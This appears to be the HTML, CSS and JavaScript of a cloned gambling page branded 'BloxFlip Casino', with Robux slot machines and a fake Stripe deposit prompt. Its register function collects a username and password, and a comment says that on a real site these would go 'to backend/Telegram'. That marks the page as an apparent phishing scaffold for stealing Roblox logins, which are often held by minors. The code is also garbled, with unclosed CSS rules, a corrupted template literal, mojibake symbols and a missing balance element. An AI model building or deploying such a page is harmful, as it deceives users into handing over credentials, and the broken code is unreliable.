    body {

      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      overflow-x: hidden;
    }
    header {
      width: 100%;
      padding: 15px 30px;
      background: rgba(0,0,0,0.8);
      backdrop-filter: blur(15px);
      border-bottom: 1px solid rgba(var(--primary),0.3);
      display: flex;
      justify-content: space-between;
      align-items: center;
      position: fixed;
      top: 0;

    .logo {

      font-size: 38px;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 0 20px rgba(var(--primary),0.7);
    }
    .balance-box {
      display: flex;
      align-items: center;
      gap: 25px;
      font-size: 20px;
      font-weight: 700;
    }
    .balance { color: var(--win); text-shadow: 0 0 12px var(--win); }
    .deposit-btn {
      padding: 10px 25px;
      background: linear-gradient(90deg, var(--win), #00bb66);
      color: #000;
      font-weight: bold;
      border: none;

      cursor: pointer;
      transition: all 0.3s;
    }
    .deposit-btn:hover { transform: scale(1.08); box-shadow: 0 0 25px var(--win); }
    .main {
      flex: 1;
      padding: 100px 20px 60px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 50px;
    }
    .welcome {
      text-align: center;
      font-size: 52px;
      font-weight: 900;
      background: linear-gradient(90deg, var(--primary), var(--secondary), var(--accent));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 0 30px rgba(var(--primary),0.8);
      margin: 30px 0;
    }
    .slots-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
      gap: 35px;
      width: 100%;
      max-width: 1600px;
    }
    .slot-card {
      background: var(--card);
      backdrop-filter: blur(16px);
      border-radius: 20px;
      border: 2px solid rgba(var(--secondary),0.4);
      padding: 35px;
      box-shadow: 0 0 60px rgba(var(--secondary),0.3);
      text-align: center;
      transition: all 0.4s;
      position: relative;
      overflow: hidden;
    }
    .slot-card:hover {
      transform: translateY(-15px);
      box-shadow: 0 0 90px rgba(var(--secondary),0.6);
    }
    .slot-title {
      font-size: 30px;
      font-weight: 900;
      margin-bottom: 20px;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    .slot-reels {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 25px;
    }
    .slot-reel {
      width: 90px;
      height: 270px;
      background: #0f0f1f;
      border-radius: 12px;
      overflow: hidden;
      box-shadow: inset 0 0 25px rgba(0,0,0,0.9);
      display: flex;
      flex-direction: column;
    }
    .symbol {
      width: 90px;
      height: 90px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 60px;
      color: #fff;
      text-shadow: 0 0 20px #fff;
    }
    .slot-bet {
      display: flex;
      justify-content: center;
      gap: 15px;
      margin-bottom: 25px;
    }
    .bet-btn {
      padding: 12px 20px;
      background: #222;
      color: #fff;
      border: 1px solid #444;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s;
    }
    .bet-btn:hover { background: #333; transform: scale(1.05); }
    .spin-btn {
      padding: 16px 60px;
      background: linear-gradient(90deg, var(--secondary), #00aaff);
      color: #000;
      font-size: 22px;
      font-weight: 900;
      border: none;
      border-radius: 14px;
      cursor: pointer;
      transition: all 0.4s;
      box-shadow: 0 8px 30px rgba(var(--secondary),0.5);

    .spin-btn:hover { transform: scale(1.08); box-shadow: 0 15px 40px rgba(var(--secondary),0.7); }
    .slot-result {

      font-size: 28px;
      font-weight: 900;

    .footer {
      text-align: center;
      padding: 30px;
      background: rgba(0,0,0,0.7);
      border-top: 1px solid rgba(var(--primary),0.3);
      font-size: 16px;
      opacity: 0.8;
    }
  </style>
</head>
<body>

  <header>

    <div class="balance-box">

      <button class="deposit-btn" onclick="deposit()">Deposit</button>
      <button onclick="register()">Register / Login</button>
    </div>
  </header>

  <div class="main">
    <div class="welcome">Welcome to BloxFlip Casino</div>

    <div class="slots-grid" id="slotsGrid"></div>
  </div>

  <div class="footer">
    ¬© 2026 BloxFlip Casino ‚Ä¢ 18+ Only ‚Ä¢ Gamble Responsibly
  </div>

  <audio id="spinSound" src="https://assets.codepen.io/605876/slot-spin.mp3" preload="auto"></audio>
  <audio id="winSound" src="https://assets.codepen.io/605876/win.mp3" preload="auto"></audio>
  <audio id="jackpotSound" src="https://assets.codepen.io/605876/jackpot.mp3" preload="auto"></audio>

  <script>
    const slotsGrid = document.getElementById('slotsGrid');
    const balanceEl = document.getElementById('balance');
    let balance = 100000;

    const symbols = ['üçí', 'üçã', 'üçâ', '‚≠ê', '7', 'üíé', 'üîî', 'BAR', 'WILD'];

    // Generate 200+ slots
    for (let i = 1; i <= 200; i++) {
      const slot = document.createElement('div');
      slot.className = 'slot-card';
      slot.innerHTML = `
        <div class="slot-title">Slot #${i} - Mega Win</div>
        <div class="slot-reels">
          <div class="slot-reel" id="reel1_${i}"></div>
          <div class="slot-reel" id="reel2_${i}"></div>
          <div class="slot-reel" id="reel3_${i}"></div>
          <div class="slot-reel" id="reel4_${i}"></div>
          <div class="slot-reel" id="reel5_${i}"></div>
        </div>
        <div class="slot-bet">
          <button class="bet-btn" onclick="changeBet(${i}, -100)">-100</button>
          <span>Bet: <span id="bet_${i}">100</span></span>
          <button class="bet-btn" onclick="changeBet(${i}, 100)">+100</button>
        </div>
        <button class="spin-btn" onclick="spinSlot(${i})">SPIN</button>
        <div class="slot-result" id="result_${i}"></div>
      `;
      slotsGrid.appendChild(slot);
    }

    function changeBet(slotId, amount) {
      let bet = parseInt(document.getElementById(`bet_${slotId}`).textContent);
      bet = Math.max(10, bet + amount);
      document.getElementById(`bet_${slotId}`).textContent = bet;
    }

    function spinSlot(slotId) {
      const bet = parseInt(document.getElementById(`bet_${slotId}`).textContent);
      if (bet > balance) {
        document.getElementById(`result_${slotId}`).textContent = 'Not enough Robux!';
        document.getElementById(`result_${slotId}`).style.color = 'red';
        return;
      }

      balance -= bet;
      balanceEl.textContent = balance;

      document.getElementById(`result_${slotId}`).textContent = 'Spinning...';
      document.getElementById(`result_${slotId}`).style.color = 'yellow';

      const reels = [
        document.getElementById(`reel1_${slotId}`),
        document.getElementById(`reel2_${slotId}`),
        document.getElementById(`reel3_${slotId}`),
        document.getElementById(`reel4_${slotId}`),
        document.getElementById(`reel5_${slotId}`)
      ];

      reels.forEach(reel => {
        reel.innerHTML = '';
        for (let j = 0; j < 40; j++) {
          const sym = document.createElement('div');
          sym.className = 'symbol';
          sym.textContent = symbols[Math.floor(Math.random() * symbols.length)];
          reel.appendChild(sym);
        }
        reel.style.animation = 'spin 3s ease-out forwards';
      });

      setTimeout(() => {
        const results = Array(5).fill().map(() => symbols[Math.floor(Math.random() * symbols.length)]);
        reels.forEach((reel, index) => {
          reel.children[reel.children.length - 1].textContent = results[index];
        });

        const won = results.every(r => r === results[0]);
        const profit = won ? bet * 20 : -bet;
        balance += won ? bet * 21 : 0;
        balanceEl.textContent = balance;

        if (won) {
          document.getElementById(`result_\( {slotId}`).textContent = `JACKPOT! + \){(bet * 20).toLocaleString()} Robux`;
          document.getElementById(`result_${slotId}`).style.color = 'lime';
          confetti({
            particleCount: 200,
            spread: 90,
            origin: { y: 0.6 }
          });
          const audio = document.getElementById('jackpotSound');
          audio.currentTime = 0;
          audio.play().catch(() => {});
        } else {
          document.getElementById(`result_${slotId}`).textContent = `Lost ${bet.toLocaleString()} Robux`;
          document.getElementById(`result_${slotId}`).style.color = 'red';
        }

        reels.forEach(reel => reel.style.animation = '');
      }, 3200);
    }

    function deposit() {
      const amount = prompt('Enter amount in $ (min 5):');
      if (!amount || isNaN(amount) || amount < 5) return;
      alert(`Depositing $${amount} via Stripe... (demo)`);
      // In real site, call Stripe API here
    }

    function register() {
      const username = prompt('Enter username:');
      const password = prompt('Enter password:');
      if (username && password) {
        alert(`Registered as ${username}! Welcome to BloxFlip.`);
        // In real site, send to backend/Telegram
      }
    }

    // Init
    balanceEl.textContent = balance;
  </script>
</body>
</html>
